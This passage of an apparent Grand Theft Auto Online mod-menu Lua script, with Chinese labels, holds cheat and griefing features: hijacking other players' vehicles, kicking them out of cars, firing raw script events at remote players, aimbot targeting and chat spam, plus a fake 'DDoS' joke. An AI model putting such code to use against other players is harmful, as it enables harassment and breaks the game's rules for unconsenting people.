            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 3.1
            c.x = c.x + 5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            util.yield(500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            util.yield(500)
            entities.delete_by_handle(veh)
        else
            util.toast(players.get_name(player_id).. " 不在载具")
        end
    end)

    control_veh_cmd = menu.toggle(trolling, "控制玩家车辆", {}, "只适用于陆地载具", function(toggle)
        control_veh = toggle

        while control_veh do 
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
            local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
            if not players.exists(player_id) then util.stop_thread() end

            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("玩家太远了")
                menu.set_value(control_veh_cmd, false)
            return end

            if class == 15 then
                util.toast("玩家在直升机上")
                menu.set_value(control_veh_cmd, false)
            break end
            
            if class == 16 then
                util.toast("玩家在飞机上")
                menu.set_value(control_veh_cmd, false)
            return end

            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                if PAD.IS_CONTROL_PRESSED(0, 34) then
                    while not PAD.IS_CONTROL_RELEASED(0, 34) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                    while not PAD.IS_CONTROL_RELEASED(0, 35) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                    while not PAD.IS_CONTROL_RELEASED(0, 32) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                    while not PAD.IS_CONTROL_RELEASED(0, 33) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                        util.yield()
                    end
                end
            else
                util.toast("玩家不在载具里")
                menu.set_value(control_veh_cmd, false)
            end
            util.yield()
        end
    end)

    menu.action(trolling, "发送DDoS", {}, "", function()
        util.toast("发送DDos攻击给" ..players.get_name(player_id))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(2000)
        util.toast("开个玩笑^^")
    end)

    menu.action(friendly, "修复加载屏幕", {}, "尝试用一种方法修复无限加载屏幕", function()
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        menu.trigger_commands("aptme" .. players.get_name(player_id))
    end)


    menu.action(friendly, "给予25等级", {}, "", function()
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x5, 0, 1, 1, 1})
        for i = 0, 9 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x0, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x1, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x3, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0xA, i, 1, 1, 1})
        end
        for i = 0, 1 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x6, i, 1, 1, 1})
        end
        for i = 0, 19 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, i, 1, 1, 1})
        end
        for i = 0, 99 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x9, i, 1, 1, 1})
            util.yield()
        end
    end)

    menu.toggle_loop(friendly, "给予筹码", {"dropchips"}, "", function(toggle)
        local coords = players.get_position(player_id)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
    end)

  

    menu.action(friendly, "给予生命和护甲", {}, "", function()
        menu.trigger_commands("autoheal"..players.get_name(player_id))
    end)

    menu.action(friendly, "赢得刑事破坏", {}, "", function()
        local fcartable = {}

        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defz = c.z
        STREAMING.REQUEST_MODEL(expcar)
        while not STREAMING.HAS_MODEL_LOADED(expcar) do
            STREAMING.REQUEST_MODEL(expcar)
            util.yield()
        end
        STREAMING.REQUEST_MODEL(floorbr)
        while not STREAMING.HAS_MODEL_LOADED(floorbr) do
            STREAMING.REQUEST_MODEL(floorbr)
            util.yield()
        end
        local success, floorcoords
        repeat
            success, floorcoords = util.get_ground_z(c.x, c.y)
            util.yield()
        until success
        floorcoords = floorcoords - 100
        c.z = floorcoords
        local floorrigp = entities.create_object(floorbr, c)
        c.z = defz
        c.z = c.z - 95 
        for i = 1, 22 do
            fcartable[#fcartable + 1] = entities.create_vehicle(expcar, c, 0) 
        end
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, floorcoords, exp, 100.0, true, false, 1.0) 
        util.yield(500)
        entities.delete_by_handle(floorrigp)
        util.yield(1000)
        
        for i = 1, #fcartable do
            entities.delete_by_handle(fcartable[i]) 
            fcartable[i] = nil
        end
    end)

    menu.toggle_loop(friendly, "检查点活动获胜", {}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        if PED.IS_PED_IN_ANY_VEHICLE(p) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
            RequestControl(veh)
            local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
            local cdblip = HUD.GET_BLIP_COORDS(dblip)
            ENTITY.SET_ENTITY_COORDS(veh, cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
            util.yield(1500)
        else
        end
    end)

--载具
    menu.action(vehicle, "修复车辆", {}, "", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
        else
        end
    end)

    local desv = menu.list(vehicle, "踢出载具", {}, "")


		
    menu.toggle_loop(desv, "循环踢出载具", {}, "", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

    local modv = menu.list(vehicle, "修改载具", {}, "")

    menu.action(modv, "随机升级", {}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        local ped = PLAYER.GET_PLAYER_PED(players.user())
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false) 
        menu.trigger_commands("tp"..players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("godmode on")
        util.yield(6000)
        if ENTITY.DOES_ENTITY_EXIST(veh) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            local getm = VEHICLE.GET_NUM_VEHICLE_MODS(veh)
            for i = 0, 70 do
                VEHICLE.SET_VEHICLE_MOD(veh, i, getm, -1, false)

            end
        else
            util.toast("获取车辆控制错误")
        end
        util.yield(500)
        menu.trigger_commands("tp"..players.get_name(player_id))
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("godmode off")
        ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, 1, false)
    end)

    menu.toggle(modv, "循环随机升级车辆", {}, "", function(on)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        local ped = PLAYER.GET_PLAYER_PED(players.user())
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false) 
        if on then
            menu.trigger_commands("invisibility on")
            menu.trigger_commands("godmode on")
            util.yield(200)
            menu.trigger_commands("tp"..players.get_name(player_id))
            util.yield(6000)
            if ENTITY.DOES_ENTITY_EXIST(veh) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                local getm = VEHICLE.GET_NUM_VEHICLE_MODS(veh)
                for i = 0, 70 do
                    VEHICLE.SET_VEHICLE_MOD(veh, i, getm, -1, false)
    
                end
            else
            end
        else
            menu.trigger_commands("tp"..players.get_name(player_id))
            menu.trigger_commands("invisibility off")
            menu.trigger_commands("godmode off")
            ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, 1, false)
        end
    end)

    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    -- 其他


    menu.action(otherc, "查看玩家的导航点", {}, "显示玩家在地图上的标记", function()    
        local playerw = players.get_waypoint(player_id)
        for i = 1, 5 do
            HUD.REFRESH_WAYPOINT()
        end
        HUD.SET_NEW_WAYPOINT(playerw.x, playerw.y, false)
        util.yield(2000)
        util.toast("玩家的标记应该已经在地图上了")
        util.yield(500)
        util.toast("如果它不显示，可能就没有标记")
    end)

end)
players.dispatch_on_join()

    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    -- 世界选项
    ----世界重力
World_gravity_option = {
    {"正常",    {"default"}, ""},
    {"低",      {"low"},     ""},
    {"非常低",  {"verylow"}, ""},
    {"无重力",  {"none"},    ""},
}
    function request_control_of_table_once(tbl)
        for index, entity in ipairs(tbl) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        end
    end
    function World_gravity(option_index)
        gravity_current_index = option_index
        if option_index ~= 1 then
            while gravity_current_index == option_index do
                request_control_of_table_once(entities.get_all_vehicles_as_handles())
                request_control_of_table_once(entities.get_all_objects_as_handles())
                request_control_of_table_once(entities.get_all_peds_as_handles())
                request_control_of_table_once(entities.get_all_pickups_as_handles())
                MISC.SET_GRAVITY_LEVEL(option_index - 1)
                util.yield()
            end
        else
            MISC.SET_GRAVITY_LEVEL(option_index - 1)
        end
    end
    menu.list_select(world,  "世界重力", {},"改变世界的引力", World_gravity_option, 1,function(option_index)
        World_gravity(option_index)
    end)
    
menu.action(world, "清除附近", {"cleararea"}, "清理该区域的所有东西", function(on_click)
    clear_area(clear_radius)
end)

menu.action(world, "超级清", {"clearworld"}, "Literally cleans everything in the area including peds, cars, objects, bools etc.", function(on_click)
    clear_area(1000000)
end)




--检测
menu.toggle_loop(detections, "无敌", {}, "检测玩家是否有无敌模式", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if players.is_godmode(player_id) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.is_player_in_interior(player_id) == interior then
                util.draw_debug_text(players.get_name(player_id) .. " 是无敌玩家")
                break
            end
        end
    end 
end)

menu.toggle_loop(detections, "载具无敌", {}, "检测玩家是否有载具无敌", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.is_player_in_interior(player_id) == interior then
                    util.draw_debug_text(players.get_name(player_id) .. " 车辆是无敌的")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(detections, "武器Mod", {}, "", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        for i, hash in ipairs(ryze.modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(player_id) .. "使用Mod武器")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "模组载具", {}, "", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(player_id)
        for i, name in ipairs(ryze.modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(player_id) .. " 是模组载具")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "室内使用武器", {}, "", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(player_id) .. " 在室内使用武器")
            break
        end
    end
end)



menu.toggle_loop(detections, "快速奔跑", {}, "", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and ryze.is_player_in_interior(player_id) == 0 and ryze.get_transition_state(player_id) ~= 0 and not PED.IS_PED_DEAD_OR_DYING(ped) 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 300.0 and ped_speed > 30 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(player_id) .. " 使用快速奔跑")
            break
        end
    end
end)

menu.toggle_loop(detections, "悬浮", {}, "检测玩家是否悬浮", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(player_id)
        util.yield()
        local currentpos = players.get_position(player_id)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(player_id)
        and ryze.is_player_in_interior(player_id) == 0 and ryze.get_transition_state(player_id) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 395.0 -- 400 was causing false positives
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(player_id) .. " 使用了悬浮")
            break
        end
    end
end)

menu.toggle_loop(detections, "传送", {}, "", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(player_id)
            util.yield(1000)
            local currentpos = players.get_position(player_id)
            for i, interior in ipairs(interior_stuff) do
                if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                and ryze.get_transition_state(player_id) ~= 0 and ryze.is_player_in_interior(player_id) == interior and PLAYER.IS_PLAYER_PLAYING(player_id) and player.exists(player_id) then
                    util.toast(players.get_name(player_id) .. " 使用了传送")
                end
            end
        end
    end
end)


menu.toggle_loop(detections, "快速加入", {}, "检测是否有人快速加入战局", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        if not util.is_session_transition_active() and ryze.get_spawn_state(player_id) == 0 and players.get_script_host() == player_id  then
            util.toast(players.get_name(player_id) .. " 使用了快速加入")
        end
    end
end)
-------聊天翻译
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")     
Languages = {
    { Name = "简体中文", Key = "zh-CN" },
    { Name = "繁体中文", Key = "zh-TW" },
    { Name = "英语", Key = "en" },
}
LangKeys = {}
LangName = {}
LangIndexes = {}
LangLookupByName = {}
LangLookupByKey = {}
PlayerSpooflist = {}
PlayerSpoof = {}
    for i=1,#Languages do
        Language = Languages[i]
            LangKeys[i] = Language.Name
            LangName[i] = Language.Name
            LangIndexes[Language.Key] = i
            LangLookupByName[Language.Name] = Language.Key
            LangLookupByKey[Language.Key] = Language.Name
    end
table.sort(LangKeys)
function encode(text)
    return string.gsub(text, "%s", "+")
end
function decode(text)
    return string.gsub(text, "%+", "")
end
function translate_toggle(on)
    traduct = on	
end
local Tradloca = 1
function translate_pos(s)
    Tradloca = s
end
local traductself = true
function translate_myself(on)
    traductself = on	
end
function translate_cc(on)
    traductsamelang = on	
end
local targetlang = "zh-CN"
function translate_target(s)
    targetlang = LangLookupByName[LangKeys[s]]
end
local botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
    sfchat = require("lib.daidailib.ScaleformLib")("multiplayer_chat")
    sfchat:draw_fullscreen()
    if not botsend then
        if not traductself and (packet_sender == players.user()) then
        else
            if traduct then
                async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
                    if Sucess ~= "" then
                        translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
                        if not traductsamelang and (sourceLang == targetlang) then
                        else
                            local sender = players.get_name(packet_sender)
                            translationtext = decode(translation)
                            colorfinal = colorselec

                            if (Tradloca == 1) then
                                botsend = true
                                chat.send_message(sender.." : "..decode(translation), true, false, true)
                                sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
                            end 
                            if (Tradloca == 2) then
                                botsend = true
                                chat.send_message(sender.." : "..decode(translation), false, false, true)
                                sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
                            end 
                            if (Tradloca == 3) then
                                util.toast(players.get_name(packet_sender).." : "..decode(translation))
                            end
                        end
                    end
                end)
                async_http.dispatch()
            end
        end
    end
    botsend = false
end)

------翻译
TRANROOT = menu.list(chat_m, "聊天翻译", {""}, "")
    menu.toggle(TRANROOT, "开启翻译", {}, "", function(on)
        translate_toggle(on)
    end)
    settingtrad = menu.list(TRANROOT, "翻译设置")
        tradlocamenu = menu.list_select(settingtrad, "翻译语言的位置", {}, "", {"团队聊天","全部聊天", "通知"},1, function(s)
            translate_pos(s)
        end)
        menu.toggle(settingtrad, "翻译自我", {}, "", function(on)
            translate_myself(on)
        end, true)
        menu.toggle(settingtrad, "强制翻译", {}, "即使语言与目标语言相同,也要进行翻译", function(on)
            translate_cc(on)
        end)
    targetlangmenu = menu.list_select(TRANROOT, "目标语言", {}, "", LangName, 1, function(s)
        translate_target(s)  
    end)
    chatspamtrash = menu.list(chat_m, "聊天刷屏")
    taunt = menu.list(chatspamtrash, "嘲讽")
        menu.action(taunt, "嘲讽v1", {""}, ": u cant crash 2stand1 pieScript user XD", function()
            chat.send_message("u cant crash 2stand1 pieScript user XD",false,true,true)
        end)
        menu.action(taunt, "嘲讽v2", {""}, ": u cant crash GTA5 Online assistant user XD", function()
            chat.send_message("u cant crash GTA5 Online assistant user XD",false,true,true)
        end)
        menu.action(chat_m, "清空聊天记录", {""}, "", function()
            chat.send_message("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",false,true,true)
        end)
       
   local interiors = {
    {"安全空间 [挂机室]", {x=-158.71494, y=-982.75885, z=149.13135}},
    {"酷刑室", {x=147.170, y=-2201.804, z=4.688}},
    {"矿道", {x=-595.48505, y=2086.4502, z=131.38136}},
    {"欧米茄车库", {x=2330.2573, y=2572.3005, z=46.679367}},
    {"50 车位车库", {x=520.0, y=-2625.0, z=-50.0}},
    {"服务器机房", {x=2474.0847, y=-332.58887, z=92.9927}},
    {"角色捏脸房间", {x=402.91586, y=-998.5701, z=-99.004074}},
    {"Lifeinvader 大楼", {x=-1082.8595, y=-254.774, z=37.763317}},
    {"竞速结束车库", {x=405.9228, y=-954.1149, z=-99.6627}},
    {"被摧毁的医院", {x=304.03894, y=-590.3037, z=43.291893}},
    {"花园银行体育场", {x=-256.92334, y=-2024.9717, z=30.145584}},
    {"Split Sides 喜剧俱乐部", {x=-430.00974, y=261.3437, z=83.00648}},
    {"录音 A 工作室", {x=-1010.6883, y=-49.127754, z=-99.40313}},
    {"巴哈马酒吧", {x=-1394.8816, y=-599.7526, z=30.319544}},
    {"看门人之家", {x=-110.20285, y=-8.6156025, z=70.51957}},
    {"费蓝德医生之家", {x=-1913.8342, y=-574.5799, z=11.435149}},
    {"杜根房子", {x=1395.2512, y=1141.6833, z=114.63437}},
    {"弗洛伊德公寓", {x=-1156.5099, y=-1519.0894, z=10.632717}},
    {"麦克家", {x=-813.8814, y=179.07889, z=72.15914}},
    {"富兰克林家 (旧)", {x=-14.239959, y=-1439.6913, z=31.101551}},
    {"富兰克林家 (新)", {x=7.3125067, y=537.3615, z=176.02803}},
    {"崔佛家", {x=1974.1617, y=3819.032, z=33.436287}},
    {"莱斯斯家", {x=1273.898, y=-1719.304, z=54.771}},
    {"莱斯特的纺织厂", {x=713.5684, y=-963.64795, z=30.39534}},
    {"莱斯特的纺织厂办事处", {x=707.2138, y=-965.5549, z=30.412853}},
    {"冰毒实验室", {x=1391.773, y=3608.716, z=38.942}},
    {"致幻剂实验室", {x=484.69, y=-2625.36, z=-49.0}},
    {"停尸房实验室", {x=495.0, y=-2560.0, z=-50.0}},
    {"人道实验室", {x=3625.743, y=3743.653, z=28.69009}},
    {"汽车旅馆客房", {x=152.2605, y=-1004.471, z=-99.024}},
    {"警察局", {x=443.4068, y=-983.256, z=30.689589}},
    {"太平洋标准银行金库", {x=263.39627, y=214.39891, z=101.68336}},
    {"布莱恩郡银行", {x=-109.77874, y=6464.8945, z=31.626724}}, -- 感谢 Fluidware 告诉我这个坐标
    {"龙舌兰酒吧", {x=-564.4645, y=275.5777, z=83.074585}},
    {"废料厂车库", {x=485.46396, y=-1315.0614, z=29.2141}},
    {"失落摩托帮", {x=980.8098, y=-101.96038, z=74.84504}},
    {"范吉利克珠宝店", {x=-629.9367, y=-236.41296, z=38.057056}},
    {"机场休息室", {x=-913.8656, y=-2527.106, z=36.331566}},
    {"停尸房", {x=240.94368, y=-1379.0645, z=33.74177}},
    {"联盟保存处", {x=1.298771, y=-700.96967, z=16.131021}},
    {"军事基地瞭望塔", {x=-2357.9187, y=3249.689, z=101.45073}},
    {"事务所内部", {x=-1118.0181, y=-77.93254, z=-98.99977}},
    {"事务所车库", {x=-1071.0494, y=-71.898506, z=-94.59982}},
    {"恐霸内部", {x=-1421.015, y=-3012.587, z=-80.000}},
    {"地堡内部", {x=899.5518,y=-3246.038, z=-98.04907}},
    {"IAA 办公室", {x=128.20, y=-617.39, z=206.04}},
    {"FIB 顶层", {x=135.94359, y=-749.4102, z=258.152}},
    {"FIB 47层", {x=134.5835, y=-766.486, z=234.152}},
    {"FIB 49层", {x=134.635, y=-765.831, z=242.152}},
    {"大公鸡", {x=-31.007448, y=6317.047, z=40.04039}},
    {"脱衣舞俱乐部 DJ 位置", {x=121.398254, y=-1281.0024, z=29.480522}},
}

local station_name = {
    ["布莱恩郡之声"] = "RADIO_11_TALK_02", 
    ["蓝色方舟"] = "RADIO_12_REGGAE",
    ["全球电台"] = "RADIO_13_JAZZ",
    ["飞莲电台"] = "RADIO_14_DANCE_02",
    ["真相 91.1"] = "RADIO_15_MOTOWN",
    ["实验室电台"] = "RADIO_20_THELAB",
    ["明镜公园之音"] = "RADIO_16_SILVERLAKE",
    ["103.2 空间"] = "RADIO_17_FUNK",
    ["好麦坞大道电台"] = "RADIO_18_90S_ROCK",
    ["金发洛圣都 97.8 电台"] = "RADIO_21_DLC_XM17",
    ["洛圣都地下电台"] = "RADIO_22_DLC_BATTLE_MIX1_RADIO",
    ["iFruit 电台"] = "RADIO_23_DLC_XM19_RADIO",
    ["自电台(如果该玩家没有设置自电台,将自动切换为 MOTOMAMI 洛圣都电台)"] = "RADIO_19_USER",
    ["洛圣都摇滚台"] = "RADIO_01_CLASS_ROCK",
    ["无止境流行乐电台"] = "RADIO_02_POP",
    ["洛圣都广播电台"] = "RADIO_03_HIPHOP_NEW",
    ["X 频道"] = "RADIO_04_PUNK",
    ["西海岸谈话电台"] = "RADIO_05_TALK_01",
    ["叛逆电台"] = "RADIO_06_COUNTRY", 
    ["灵魂之蜡电台"] = "RADIO_07_DANCE_01",
    ["东洛电台"] = "RADIO_08_MEXICAN",
    ["西海岸经典"] = "RADIO_09_HIPHOP_OLD",
    ["媒体播放器"] = "RADIO_36_AUDIOPLAYER",
    ["音乐柜"] = "RADIO_35_DLC_HEI4_MLR",
    ["库尔特 FM"] = "RADIO_34_DLC_HEI4_KULT",
    ["放松依旧洛圣都"] = "RADIO_27_DLC_PRHEI4",
}
local values = {
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local unreleased_vehicles = {
    "virtue",
    "broadway",
    "everon2",
    "eudora",
    "boor"
}
function pid_to_handle(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, memory.alloc(13*8), 13)
    return memory.alloc(13*8)
end

saimbot_mode = "closest"
function get_aimbot_target()
    local dist = 1000000000
    local cur_tar = 0
    for k,v in pairs(entities.get_all_peds_as_handles()) do
        local target_this = true
        local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        local ped_pos = ENTITY.GET_ENTITY_COORDS(v, true)
        local this_dist = MISC.GET_DISTANCE_BETWEEN_COORDS(player_pos['x'], player_pos['y'], player_pos['z'], ped_pos['x'], ped_pos['y'], ped_pos['z'], true)
        if PLAYER.PLAYER_PED_ID() ~= v and not ENTITY.IS_ENTITY_DEAD(v) then
            if not satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not satarget_npcs then
                if not PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(PLAYER.PLAYER_PED_ID(), v, 17) then
                target_this = false
            end
            if satarget_usefov then
                if not PED.IS_PED_FACING_PED(PLAYER.PLAYER_PED_ID(), v, sa_fov) then
                    target_this = false
                end
            end
            if satarget_novehicles then
                if PED.IS_PED_IN_ANY_VEHICLE(v, true) then
                    target_this = false
                end
            end
            if satarget_nogodmode then
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(v) then
                    target_this = false
                end
            end
            if not satarget_targetfriends and satarget_players then
